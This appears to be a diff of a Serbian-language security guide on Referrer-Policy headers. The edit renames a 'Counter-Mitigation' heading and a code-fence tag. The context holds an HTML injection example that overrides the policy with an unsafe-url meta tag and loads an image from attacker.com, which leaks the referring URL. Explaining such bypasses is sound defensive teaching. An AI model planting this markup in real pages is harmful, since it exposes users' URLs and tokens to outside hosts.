@@ -21,10 +21,10 @@ Referrer-Policy: strict-origin
 Referrer-Policy: strict-origin-when-cross-origin
 Referrer-Policy: unsafe-url
 ```
-## Protiv-mitigator
+## Counter-Mitigation
 
 Možete prepisati ovo pravilo koristeći HTML meta tag (napadač treba da iskoristi i HTML injekciju):
-```markup
+```html
 <meta name="referrer" content="unsafe-url">
 <img src="https://attacker.com">
 ```
